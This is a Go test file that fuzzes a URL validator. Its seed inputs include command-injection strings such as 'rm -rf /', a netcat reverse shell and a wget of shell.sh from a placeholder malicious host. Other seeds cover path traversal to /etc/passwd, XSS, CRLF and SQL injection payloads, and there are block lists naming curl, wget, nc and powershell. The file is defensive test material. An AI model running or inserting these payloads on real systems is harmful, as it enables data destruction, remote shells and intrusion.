package validation

import (
	"net/url"
	"strings"
	"testing"
)

// FuzzValidateURL tests URL validation with various malicious and edge case inputs
func FuzzValidateURL(f *testing.F) {
	// Seed with valid and invalid URLs
	f.Add("http://localhost:8080")
	f.Add("https://example.com")
	f.Add("javascript:alert('xss')")
	f.Add("data:text/html,<script>alert('xss')</script>")
	f.Add("file:///etc/passwd")
	f.Add("ftp://example.com")
	f.Add("http://localhost:8080; rm -rf /")
	f.Add("http://localhost:8080 && curl malicious.com")
	f.Add("http://localhost:8080|nc -e /bin/sh malicious.com 4444")
	f.Add("http://localhost:8080`whoami`")
	f.Add("http://localhost:8080$(id)")
	f.Add("http://localhost:8080')")
	f.Add("http://localhost:8080\")")
	f.Add("http://localhost:8080\\admin")
	f.Add("http://localhost:8080\nGET /admin")
	f.Add("http://localhost:8080\r\nHost: malicious.com")
	f.Add("http://user:pass@localhost:8080")
	f.Add("http://")
	f.Add("")
	f.Add("not-a-url")

	f.Fuzz(func(t *testing.T, testURL string) {
		if len(testURL) > 10000 {
			t.Skip("URL too long")
		}

		err := ValidateURL(testURL)

		// If validation passed, ensure the URL is actually safe
		if err == nil {
			// Parse the URL to verify it's legitimate
			parsed, parseErr := url.Parse(testURL)
			if parseErr != nil {
				t.Errorf("ValidateURL passed but URL.Parse failed for: %q", testURL)
				return
			}

			// Ensure only safe schemes are allowed
			if parsed.Scheme != "http" && parsed.Scheme != "https" {
				t.Errorf("ValidateURL passed for dangerous scheme: %q", testURL)
			}

			// Ensure no command injection characters
			dangerousChars := []string{";", "&", "|", "`", "$", "(", ")", "<", ">", "\"", "'", "\\", "\n", "\r", " "}
			for _, char := range dangerousChars {
				if strings.Contains(testURL, char) {
					t.Errorf("ValidateURL passed for URL with dangerous character %q: %q", char, testURL)
				}
			}

			// Ensure hostname is present
			if parsed.Host == "" {
				t.Errorf("ValidateURL passed for URL without hostname: %q", testURL)
			}

			// Additional checks for common attack patterns
			if strings.Contains(testURL, "javascript:") ||
				strings.Contains(testURL, "data:") ||
				strings.Contains(testURL, "file:") ||
				strings.Contains(testURL, "vbscript:") {
				t.Errorf("ValidateURL passed for dangerous protocol: %q", testURL)
			}
		}
	})
}

// FuzzURLParsing tests URL parsing edge cases that could bypass validation
func FuzzURLParsing(f *testing.F) {
	// Seed with tricky URL patterns
	f.Add("http://localhost:8080/../../../etc/passwd")
	f.Add("http://localhost:8080/%2e%2e/%2e%2e/etc/passwd")
	f.Add("http://localhost:8080\\..\\..\\windows\\system32")
	f.Add("http://localhost@malicious.com:8080")
	f.Add("http://localhost:8080@malicious.com")
	f.Add("http://localhost:8080#javascript:alert('xss')")
	f.Add("http://localhost:8080?param='; DROP TABLE users; --")
	f.Add("http://localhost\x00.malicious.com:8080")
	f.Add("http://localhost\t.malicious.com:8080")
	f.Add("http://localhost\n.malicious.com:8080")

	f.Fuzz(func(t *testing.T, testURL string) {
		if len(testURL) > 5000 {
			t.Skip("URL too long")
		}

		// Test that URL parsing doesn't cause unexpected behavior
		parsed, err := url.Parse(testURL)
		if err != nil {
			// Invalid URLs are expected
			return
		}

		// If URL parsed successfully, check for dangerous patterns
		if parsed.Host != "" {
			// Check for control characters in hostname
			if strings.ContainsAny(parsed.Host, "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f") {
				t.Errorf("URL parsing allowed control characters in host: %q", parsed.Host)
			}

			// Check for path traversal in hostname (confused deputy attack)
			if strings.Contains(parsed.Host, "..") {
				t.Errorf("URL parsing allowed path traversal in host: %q", parsed.Host)
			}
		}

		// Check path for dangerous patterns - if Go's parser allows them,
		// our validation should catch them
		if strings.Contains(parsed.Path, "..") &&
			(strings.Contains(parsed.Path, "etc") || strings.Contains(parsed.Path, "system32")) {
			// This is a dangerous URL that Go parsed - our ValidateURL should reject it
			err := ValidateURL(testURL)
			if err == nil {
				t.Errorf("Our ValidateURL failed to reject dangerous path traversal URL: %q (path: %q)", testURL, parsed.Path)
			}
		}

		// Test our validation against this parsed URL
		err = ValidateURL(testURL)
		if err == nil {
			// If our validation passed, the URL should be safe
			if parsed.Scheme != "http" && parsed.Scheme != "https" {
				t.Errorf("Our validation allowed dangerous scheme: %q", testURL)
			}
		}
	})
}

// FuzzPathTraversal tests path traversal patterns in URLs
func FuzzPathTraversal(f *testing.F) {
	// Seed with various path traversal patterns
	f.Add("http://localhost:8080/../admin")
	f.Add("http://localhost:8080/../../etc/passwd")
	f.Add("http://localhost:8080/%2e%2e/admin")
	f.Add("http://localhost:8080/%2e%2e%2f%2e%2e%2fetc%2fpasswd")
	f.Add("http://localhost:8080/..%2fadmin")
	f.Add("http://localhost:8080/..\\admin")
	f.Add("http://localhost:8080/....//admin")
	f.Add("http://localhost:8080/..;/admin")

	f.Fuzz(func(t *testing.T, pathURL string) {
		if len(pathURL) > 2000 {
			t.Skip("Path URL too long")
		}

		// Skip non-HTTP URLs to focus on path traversal
		if !strings.HasPrefix(pathURL, "http://") && !strings.HasPrefix(pathURL, "https://") {
			t.Skip("Not an HTTP URL")
		}

		err := ValidateURL(pathURL)

		// If validation passed, ensure no dangerous path traversal was allowed
		if err == nil {
			parsed, parseErr := url.Parse(pathURL)
			if parseErr == nil && parsed.Path != "" {
				// Check for encoded path traversal
				if strings.Contains(parsed.Path, "..") ||
					strings.Contains(pathURL, "%2e%2e") ||
					strings.Contains(pathURL, "%2E%2E") ||
					strings.Contains(pathURL, "....") {
					t.Errorf("Validation allowed potential path traversal: %q", pathURL)
				}
			}
		}
	})
}

// FuzzProtocolHandlers tests various protocol handlers that could bypass validation
func FuzzProtocolHandlers(f *testing.F) {
	// Seed with various protocol handlers
	f.Add("javascript:alert('xss')")
	f.Add("vbscript:MsgBox('xss')")
	f.Add("data:text/html,<script>alert('xss')</script>")
	f.Add("file:///etc/passwd")
	f.Add("ftp://malicious.com")
	f.Add("ldap://malicious.com")
	f.Add("gopher://malicious.com")
	f.Add("mailto:admin@localhost.com")
	f.Add("tel:+1234567890")
	f.Add("sms:+1234567890")
	f.Add("JAVASCRIPT:alert('xss')")     // Case variation
	f.Add("Java\x00Script:alert('xss')") // Null byte injection

	f.Fuzz(func(t *testing.T, protocolURL string) {
		if len(protocolURL) > 1000 {
			t.Skip("Protocol URL too long")
		}

		err := ValidateURL(protocolURL)

		// All non-HTTP(S) protocols should be rejected
		if err == nil {
			parsed, parseErr := url.Parse(protocolURL)
			if parseErr == nil {
				if parsed.Scheme != "http" && parsed.Scheme != "https" {
					t.Errorf("Validation allowed dangerous protocol: %q", protocolURL)
				}
			}
		}
	})
}

// FuzzCommandInjection tests command injection patterns in URLs
func FuzzCommandInjection(f *testing.F) {
	// Seed with command injection patterns
	f.Add("http://localhost:8080; curl malicious.com")
	f.Add("http://localhost:8080 && rm -rf /")
	f.Add("http://localhost:8080 | nc -e /bin/sh malicious.com")
	f.Add("http://localhost:8080`whoami`")
	f.Add("http://localhost:8080$(id)")
	f.Add("http://localhost:8080;wget http://malicious.com/shell.sh")
	f.Add("http://localhost:8080&powershell.exe")
	f.Add("http://localhost:8080|python -c 'import os; os.system(\"id\")'")

	f.Fuzz(func(t *testing.T, injectionURL string) {
		if len(injectionURL) > 2000 {
			t.Skip("Injection URL too long")
		}

		err := ValidateURL(injectionURL)

		// All URLs with command injection patterns should be rejected
		if err == nil {
			dangerousPatterns := []string{";", "&", "|", "`", "$", "rm ", "curl ", "wget ", "nc ", "powershell", "cmd.exe"}
			for _, pattern := range dangerousPatterns {
				if strings.Contains(injectionURL, pattern) {
					t.Errorf("Validation allowed command injection pattern %q in URL: %q", pattern, injectionURL)
				}
			}
		}
	})
}
